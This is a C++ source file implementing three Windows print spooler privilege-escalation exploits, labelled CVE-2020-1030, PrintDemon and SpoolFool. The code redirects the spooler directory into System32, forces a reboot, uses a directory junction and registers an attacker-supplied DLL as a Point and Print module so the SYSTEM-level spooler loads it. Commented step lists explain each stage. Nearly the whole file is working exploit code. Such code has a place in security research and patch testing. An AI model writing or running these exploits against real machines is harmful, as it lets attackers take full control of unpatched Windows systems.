#include "exploits.h"

#include <Windows.h>
#include <iostream>
#include <string>

#include "utils.h"
#include "printers.h"

using std::endl; 
using std::cout; 
using std::string; 

/*
	1. set the SpoolDirectory of the printer to C:\\Windows\System32\spool\drivers\x64\4
	2. once the spooling service is restarted, the directory is created. Being a SpoolDirectory is set to be writeable by all users (only if it is created, if it already exits, then its permissions are not changed)
	3. so we need to force the spooling service to restart, in our case we restart the computer and register the app to be called by the OS 
	4. once the service is restarted, and the C:\\Windows\System32\spool\drivers\x64\4 directory created, we can copy the malicious.dll inside that directory
	5. setting C:\\Windows\System32\spool\drivers\x64\4\malicious.dll as PointAndPrint DLL, it will be loaded: DONE!

	malicious.dll, imitating as a Point and Print DLL, must export the SpoolerCopyFileEvent function.
	This function is called once the module is loaded into the process.		

	parameters of the function: 
	 - printerName: name of the printer we are considering 
	 - filePath: path to the dll or file that has to be 
	 - isRestarted: boolean variable indicating if the program has been called after a reboot or not
*/
void cve_2020_1030(wchar_t* printerName, wchar_t* filePath, bool isRestarted) {

	// path of the v4 printer driver directory 
	wchar_t* v4DriverDir = const_cast<wchar_t*>(L"C:\\Windows\\System32\\spool\\drivers\\x64\\4");
	
	// open considered directory 
	HANDLE hPrinter = OpenPrinter(printerName);
	DWORD cbData, dwStatus; // utils variables 

	// check if the program is executed after a reboot 
	if (isRestarted) {
		// check if v4 driver directory has been correctly created 
		if (!doesDirExists(v4DriverDir)) {
			cout << "[-] v4 directory not created" << endl;
			return;
		}
		cout << "[+] v4 directory successfully created" << endl;
		
		// path and name of the files that will be created inside the System32 directory 
		wchar_t* newFilePath = const_cast<wchar_t*>(L"C:\\Windows\\System32\\spool\\drivers\\x64\\4\\cve_2020_1030.dll"),
			* newFileName = const_cast<wchar_t*>(L"cve_2020_1030.dll"); 

		// move the file passed as parameter inside the newFilePath inside the cve_2020_1030.dll 
		if (!MoveFile(filePath, newFilePath)) {
			cout << "[-] Error while copying the DLL inside v4 directory, error: " << GetLastError() << endl;
			return;
		}
		cout << "[+] DLL correctly copied inside v4 directory" << endl;

		// set the cve_2020_1030.dll as PointAndPrint DLL 	
		cbData = ((DWORD)wcslen(newFileName) + 1) * sizeof(WCHAR);
		dwStatus = SetPrinterDataEx(hPrinter, L"CopyFiles\\Payload", L"Module", REG_SZ, (LPBYTE)newFileName, cbData);

		if (dwStatus != ERROR_SUCCESS) {
			cout << "[-] Error while setting the PointAndPrint DLL" << dwStatus << endl;
			return;
		}
		cout << "[+] PointAndPrint DLL correctly set" << endl;

	}
	else {
		cbData = ((DWORD)wcslen(v4DriverDir) + 1) * sizeof(WCHAR); // size of the value 

		// request to update the spool directory 
		dwStatus = SetPrinterDataEx(hPrinter, L"\\", L"SpoolDirectory", REG_SZ, (LPBYTE)v4DriverDir, cbData);

		// check if the spool directory has been updated successfully 
		if (dwStatus != ERROR_SUCCESS) {
			cout << "[-] Error while setting SpoolDirectory to v4: " << dwStatus << endl;
			return;
		}
		cout << "[+] SpoolDirectory correctly set to v4" << endl;

		// restart the spooling service (and the system) to create the SpoolDirectory
		BOOL result = registerApplicationAndRestartSystem();
	}

	ClosePrinter(hPrinter);
}

/*
	1. consider a driver Generic / Text Only
	2. consider a port pointing to a privileged location of the file system
	3. create printer with the previous driver and port
	4. start printing inside the port
	5. pause the printing job
	6. reboot and restart the job 
*/
void print_demon(wchar_t* printerName, std::string payload, bool isRestarted) {
	
	// check if the program has been started after a reboot 
	if (!isRestarted) {

		// create a handle to the considered printer 
		HANDLE hPrinter = OpenPrinter(printerName);

		// start the printing job 
		DOC_INFO_1 docInfo;
		docInfo.pDatatype = const_cast<wchar_t*>(L"RAW");
		docInfo.pOutputFile = NULL;
		docInfo.pDocName = const_cast<wchar_t*>(L"Document");
		DWORD jobID = StartDocPrinter(hPrinter, 1, (LPBYTE)&docInfo);

		// check if the printing job has been correctly created 
		if (jobID == 0) {
			cout << "[-] Impossible to start the printing job" << endl;
			return;
		}
		cout << "[+] Printing job correctly started, with ID: " << jobID << endl;

		// start the printing process 
		DWORD dwNeeded = (DWORD)strlen(payload.c_str());
		char* pText = const_cast<char*>(payload.c_str());
		if (!WritePrinter(hPrinter, pText, dwNeeded, &dwNeeded)) {
			cout << "[-] Error while requesting to print inside the job" << endl;
			return;
		}
		cout << "[+] Correctly started to print" << endl;
		EndDocPrinter(hPrinter); 

		// pause the print job 
		if (!SetJob(hPrinter, jobID, 0, NULL, JOB_CONTROL_PAUSE)) {
			cout << "[-] Error while pausing the printing job, error: " << GetLastError() << endl;
			return;
		}
		cout << "[+] Correctly paused the job" << endl;

		// request the application to be started after the reboot and start the reboot 
		registerApplicationAndRestartSystem();
	}
	else {
		// get handle to the considered printer 
		HANDLE hPrinter = OpenPrinter(printerName);

		// struct used to store print job information 
		JOB_INFO_1* pJobInfo = NULL;

		// helper variable 
		DWORD dwNeeded, dwReturned;

		// Get amount of memory needed to store the current jobs inside the printing queue 
		if (!EnumJobs(hPrinter, 0, 1, 1, NULL, 0, &dwNeeded, &dwReturned)) {
			if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
				cout << "[-] Error while obtaining memory necessary to enumerate printing jobs, error: " << GetLastError() << endl;
				return;
			}
		}
		cout << "[+] Successfully obtained memory necessary, " << dwNeeded << "\t" << dwReturned << endl;

		// allocate a job info pointer using the data obtained before 
		pJobInfo = (JOB_INFO_1*)malloc(dwNeeded);

		// enumerate the print queue jobs 
		if (!EnumJobs(hPrinter, 0, 1, 1, (LPBYTE)pJobInfo, dwNeeded, &dwNeeded, &dwReturned)) {
			cout << "[-] Error while obtaining first element of the queue, error: " << GetLastError() << endl;
			return;
		}
		if (pJobInfo == NULL) {
			cout << "[-] Job Info pointer is still NULL" << endl;
			return;
		}
		cout << "[+] Successfully obtained first element of the queue, id: " << pJobInfo[0].JobId << endl;

		// access to the first job in the queue and unpause it 
		if (SetJob(hPrinter, pJobInfo[0].JobId, 0, NULL, JOB_CONTROL_RESUME)) {
			if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
				cout << "[-] Error while resuming the print job, error: " << GetLastError() << endl;
				return;
			}
		}

		cout << "[+] Restarted printing job" << endl;
	}
}

/*
	same as cve_2020_1030, the main difference is that: 
	 - we first set the SpoolDirectory value to a directory the user has permissions to write into 
	 - once the SpoolDirectory has been correctly set, before the reboot we change an element inside its path to point to C:\Windows\System32\spool\drivers\x64\4, 
	 - after the reboot the checks about the path are NOT repeated, and the C:\Windows\System32\spool\drivers\x64\4 directory is created with write permissions for all users
*/
void spool_fool(wchar_t* printerName, wchar_t* filePath, bool isRestarted) {

	// path of the v4 printer driver directory 
	wchar_t* v4DriverDir = const_cast<wchar_t*>(L"C:\\Windows\\System32\\spool\\drivers\\x64\\4");

	// open considered directory 
	HANDLE hPrinter = OpenPrinter(printerName);
	DWORD cbData, dwStatus; // utils variables 

	// check if the program is executed after a reboot 
	if (isRestarted) {
		// check if v4 driver directory has been correctly created 
		if (!doesDirExists(v4DriverDir)) {
			cout << "[-] v4 directory not created" << endl;
			return;
		}
		cout << "[+] v4 directory successfully created" << endl;

		// path and name of the files that will be created inside the System32 directory 
		wchar_t* newFilePath = const_cast<wchar_t*>(L"C:\\Windows\\System32\\spool\\drivers\\x64\\4\\cve_2020_1030.dll"),
			* newFileName = const_cast<wchar_t*>(L"cve_2020_1030.dll");

		// move the file passed as parameter inside the newFilePath inside the cve_2020_1030.dll 
		if (!MoveFile(filePath, newFilePath)) {
			cout << "[-] Error while copying the DLL inside v4 directory, error: " << GetLastError() << endl;
			return;
		}
		cout << "[+] DLL correctly copied inside v4 directory" << endl;

		// set the cve_2020_1030.dll as PointAndPrint DLL 	
		cbData = ((DWORD)wcslen(newFileName) + 1) * sizeof(WCHAR);
		dwStatus = SetPrinterDataEx(hPrinter, L"CopyFiles\\Payload", L"Module", REG_SZ, (LPBYTE)newFileName, cbData);

		if (dwStatus != ERROR_SUCCESS) {
			cout << "[-] Error while setting the PointAndPrint DLL" << dwStatus << endl;
			return;
		}
		cout << "[+] PointAndPrint DLL correctly set" << endl;

	}
	else {
		bool isCreatedTmp = CreateDirectoryW(L"C:\\Users\\User\\Desktop\\tmp", NULL);
		if (!isCreatedTmp) {
			std::cout << "[-] Tmp dir ERROR :" << GetLastError() << std::endl;
			system("pause");
			return;
		}
		std::cout << "[+] Tmp dir created !\n";


		cbData = ((DWORD)wcslen(v4DriverDir) + 1) * sizeof(WCHAR); // size of the value 

		// request to update the spool directory 
		dwStatus = SetPrinterDataEx(hPrinter, L"\\", L"SpoolDirectory", REG_SZ, (LPBYTE)L"C:\\Users\\User\\Desktop\\tmp\\4", cbData);

		// check if the spool directory has been updated successfully 
		if (dwStatus != ERROR_SUCCESS) {
			cout << "[-] Error while setting SpoolDirectory to v4: " << dwStatus << endl;
			return;
		}
		cout << "[+] SpoolDirectory correctly set to v4" << endl;

		bool isRemovedTmp = RemoveDirectoryW(L"C:\\Users\\User\\Desktop\\tmp");
		if (!isRemovedTmp) {
			std::cout << "[-] Removed directory ERROR: " << GetLastError();
			system("pause");
			return;
		}
		std::cout << "[+] Tmp dir correctly removed !\n";

		// create symbolic link after the spool directory has been correctly set 
		system("cmd /c mklink  /J \"C:\\Users\\User\\Desktop\\tmp\" \"C:\\Windows\\System32\\spool\\drivers\\x64\"");
		// std::cout << "[+] created junction directory C:\\Users\\User\\Desktop\\tmp\ <-> C:\\Windows\\System32\\spool\\drivers\\x64\\4" << std::endl; 

		// restart the spooling service (and the system) to create the SpoolDirectory
		BOOL result = registerApplicationAndRestartSystem();
	}

	ClosePrinter(hPrinter);
}